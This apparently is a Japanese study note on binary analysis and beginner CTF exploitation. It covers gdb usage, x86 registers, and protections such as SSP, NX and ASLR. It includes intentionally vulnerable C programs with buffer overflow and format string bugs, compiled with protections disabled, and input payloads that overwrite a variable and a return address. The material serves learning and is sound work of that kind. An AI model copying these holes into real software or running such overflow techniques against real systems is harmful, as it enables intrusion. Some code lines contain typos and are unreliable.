---
layout: default
---

# analyzing binaries and intro to pwning

## 環境構築
- ELFのための32bit/64bitのLinuxを用意するところから始める
- EXEのためのWindows環境も用意する
- Linux: file, readelf, strings, unzip/tar/xz + strace, ltrace, radare2, ghexをインストール
- gdb, objdumpもインストール
- dex2jarもダウンロード、実行可能に
- jdguiも同様
- Windowsであれば、OllyDbg, うさみみハリケーン、 IDA Free, ILSpy, Bz等があればよい

## ３つの解析手法
- 表層解析
	- フォーマットを確認
	- 印字可能文字列を確認
- 実行環境を用意して動的解析
- 逆アセンブルして静的解析

## Intro to gdb debugger
- disas (function name)
- x/ (命令数) i (先頭アドレス)
- set disassembly-flavor (intel/att)
- b (関数名)
- b (アドレス)
- show breakpoint info: i b
- delete breakpoint: d (breakpoint num)
- disable (breakpoint num) / enable
- ignore
- run: r
- stop at main: start
- set args (cli arg1) (cli arg2)
- set (レジスタ名)=(値)
- step over: ni
- step in: si
- continue: c
- read register: p (レジスタ名)
- info registers: i r
- x/(表示する数)(メモリサイズbhwg)(表示フォーマットsix) (表示するメモリの先頭アドレス)
- backtrace: bt
- watch/rw/aw (メモリアドレス)

## アセンブリ言語
- レジスタとスタック x86アーキテクチャ
- レジスタ：プロセッサ内に存在する記憶装置であり、メモリや補助記憶装置と比較して高速に動作する。32bit CPU, 64bit CPU
- x86アーキテクチャのレジスタ（32 bit registers）
- EAX, ECX, EDX, EBX, ESI, EDIの６つの汎用レジスタ
- EBP, ESP, EIPの特殊レジスタ
- EFLAGSのフラグレジスタ
- セグメントレジスタ


### Example assembly code and its corresponding stacks

```
Func1:
    push arg2
    push arg1
    call Func2
    mov retval, eax

Func2:
    push ebp
    mov ebp, esp
    sub esp, 100h
    mov eax, [ebp+8]
    mov ebx, [ebp+Ch]
    …
    mov esp, ebp
    pop ebp
    ret
```


### disassemble from binary using objdump
```
$ objdump -d -m intel crack_me
```

rasm2 -d 9090 -> nop nop

C言語でプログラムを書き、コンパイルしてバイナリにしたものを解析してみる

```
$ gcc -Wall hello.c -o hello
$ objdump -d hello -x86-asm-syntax=intel
```

## Upcoming CTFs
### Google CTF 2018
https://capturetheflag.withgoogle.com/
How can I prepare for this competition?  
  A good introduction to CTFs is available here:  
    https://trailofbits.github.io/ctf/index.html  
  If you want to practice similar challenges to the ones you will be asked for
  you can play security wargames such as:  
    * Microcorruption: https://microcorruption.com/  
    * Cryptopals: https://cryptopals.com/  
    * XSS Game: https://www.xssgame.com  
  If you want even more, there is also a long list of sites that offer
  security-related wargames here:  
    https://www.wechall.net/active_sites  
  And you can find the write-ups of Google's last year CTF here:  
    https://drive.google.com/corp/drive/folders/0BwMPuUHZOj0nZ2dGZS1KbWNGN0E  
  and here:  
    https://ctftime.org/event/455/tasks/  

https://github.com/google/google-ctf  


# into to pwning
## basic tools and what they do
### checksec.sh
https://github.com/slimm609/checksec.sh  
実行ファイルが備えているセキュリティ機構を読みやすい形式で表示してくれるシェルスクリプト。  
RELRO, SSP, NX bitの確認を行う。

RELRO: RElocation ReadOnly  
メモリ上に配置されるデータのどの部分に対してReadOnly属性を付けるかを決定。  
- No RELRO
- Partial RELRO (Lazy)
- Full RELRO
の３種類が存在し、GOT Overwrite exploitを行えるかを判断  
GOT Overwrite攻撃が成功するのは、No RELROとPartial RELROの場合のみ。詳しくは後述する。  

Stack Smash Protection (SSP)  
スタックフレームのローカル変数領域とSaved EBPの間にCanaryと呼ばれる値を挿入し、関数の終了時にその値が書き換えられているかどうかを判定するこでBuffer Overflowの検出を行う。Canary値には乱数が用いられるが、LSBがnullバイトになるようになってる。  
多くのコンパイラではこのSSPが有効になってるが、gccではコンパイルするときに`-fno-stack-protector`オプションを指定することで無効化できる。  

NX bit: No execute bit  
メモリ上の実効する必要のないデータを実効不可能に設定することで、攻撃者がシェルコードを使って攻撃するのを困難にする。任意コードの実効が不可能になるため、実効可能コードの断片をうまく組み合わせて攻撃することになる。gccでは`-z execstack`オプションをコンパイル時に付与することでNX bitを無効化できる。

ASLR: Address Space Layout Randomization  
スタックやヒープ、共有ライブラリ等をメモリに配置するときに、アドレスの一部をランダム化することで攻撃者がアドレスを推測するのを困難にする。CTFではほとんどの問題でASLR有効になってる。  
Ubuntu 14.04 LTSでは次のコマンドでON/OFFを切り替え。  
```
ON: $ sudo sysctl -w kernel.randomize_va_space=2
OFF: $ sudo sysctl -w kernel.randomize_va_space=0
```

### peda (installed in kali)
- pdisassemble pdisass
- ropgadget
- pattern
- vmmap



# Finding Vulnerabilities
プログラムが落ちるような入力を探すことで、書き込み不可能なアドレスに書き込もうとしていたり、実効不可能なアドレスを実効しようとしたりしている箇所を特定でき、それをうまく制御することで、プログラムの実効位置（IP=instruction pointer）を自由に変更できる状態に持っていける。eip(rip)を奪えれば脆弱性を探すステップはほぼ終わり。一旦はシェルを奪取できるかどうか。

## ユーザー入力を扱う関数
scanf, fgetsなどは入力をメモリ上に配置するため入力がバッファサイズを超えてしまうとbofの脆弱性に繋がることがある。

```c
// bof.c
#include <stdio.h>

int main(int argc, char *argv[]) {
	char buffer[100];
	fgets(buffer, 128, stdin);
	return 0;
}
```
buffer変数のサイズは100バイト分だが、標準入力から読み込まれる文字列は最大128バイトになってる。SSP無効の状態で実効すると、Bofを発生できる。Segmentation faultとでるはず。
```
$ gcc -m32 -fno-stack-protector -o bof bof.c
$ python -c 'print(CTF for Beginners)' | ./bof
$ python -c 'print("A"*128)' | ./bof
Segmentation fault
```
`python -c 'print("A"*128)' | strace -i ./bof`とトレースすることにより、eipが奪えてることを確認できる。

## printf系関数の書式文字列攻撃
printfなどで書式文字列を扱う関数では、書式文字列部分にユーザーの入力を用いてしまうと入力に書式指定子が存在した場合、その部分がフォーマットされてすったくのデータが出力されてしまう。直接はeip奪取にはつながらないが深刻な脆弱性。

```format.c
#include <stdio.h>

int main(int argc, char *argv[]) {
	char str[128];
	fgets(str, 128, stdin);
	printf("Hello, ")
	print(str);
	return 0;
}
```

```
$ gcc -m32 -o format format.c
$ ./format
%x,%x,%x,%x,%x
Hello, 80, f7......important data.....
```

# Exploiting
Disable ASLR before doing the following.

## Stack Overflow
### ローカル変数を破壊する
```bof1.c
#include <stdio.h>

int main(int argc, char *argv[]) {
	int zero = 0;
	char buffer[10];

	printf("buffer address\t= %x\n", (int)buffer);
	printf("zero address\t= %x\n", (int)&zero);

	fgets(buffer, 64, stdin);
	printf("zero = %d\n", zero);
	return 0;
}
```
このコードを32bit向け、SSP無効でコンパイル。
```
$ gcc -m32 -fno-stack-protector -o bof1 bof1.c
```
入力にAAAAAAAAAAAAAAAAを入れると変数zeroが任意の整数になる。

### ローカル変数を任意の値に書き換える
`'AAAA' = 0x41414141 = 1094795585`
入力をうまく調整すればzero変数に自由な値を設定できる。

```bof2.c
#include <stdio.h>

int main(int argc, char *argv[]) {
	char buffer[10];
	int zero = 0;

	fgets(buffer, 64, stdin);
	printf("zero = %x\n", zero);
	if (zero == 0x12345678) {
		printf("congrats!");
	}
	return 0;
}
```
コンパイル、実行
```
$ gcc -m32 -fno-stack-protector -o bof2 bof2.c
$ echo -e 'AAAAAAAAAA\x12\x34\x56\x78' | ./bof2
$ echo -e 'AAAAAAAAAA\x78\x56\x34\x12' | ./bof2
```
little endianであることに注意
追記）後日これで試してみたらsegfaultは起こせても、変数の任意の書き換えは行えなかった。標準入力からfgetsしたときには、終端文字として0x0aが追加され、int zeroの4バイト分を全て上書きしようとすると、そのすぐ次の1バイトが0x0aで書き換わってしまう。以下のようにmain関数以外の関数で書くと正常の動く... なぜなんだ...
```c
#include <stdio.h>
#include <stdlib.h>

void foo() {
	int zero = 0;
	char buffer[10];

	printf("buffer address = %x\n",(int)buffer);
	printf("zero address = %x\n", (int)&zero);

	fgets(buffer, 64, stdin);
	printf("zero = %x\n", zero);
	if (zero == 0x12345678) {
	printf("congrats!!");
	}
}
int main() {
	foo();
	return 0;
}

```
g optionをつけると、gdbでシンボルつきになる。
```
$ gcc -m32 -fno-stack-protector -g -o bof2 bof2.c
```

### リターンアドレスの書き換え

リターンアドレスを書き換えることでプログラムの実効一を変更することができる。

```c
#include <stdio.h>
#include <string.h>

char buffer[32];

int main(int argc, char *argv[]) {
	char local[32];
	printf("buffer: 0x%x\n", &buffer);
	fgets(local, 128, stdin);
	strcpy(buffer, local);
	return 0;
}
```
これではEIPをうまく奪取できなかった。
関数を分けて、実行するとうまくいく。

```c
#include <stdio.h>
#include <string.h>

char buffer[32];

void foo() {
	char local[32];
	printf("buffer: 0x%x\n", &buffer);
	fgets(local, 128, stdin);
	strcpy(buffer, local);
}

int main(int argc, char *argv[]) {
	foo();
	return 0;
}

```
main関数の先頭アドレスを取得できれば、
```
$ python -c "print 'A'*44 + '\x9e\x55\x55\x56'" | ./bof2
```
などでEIPを奪取し、main関数を2回実行できる。


[back](./)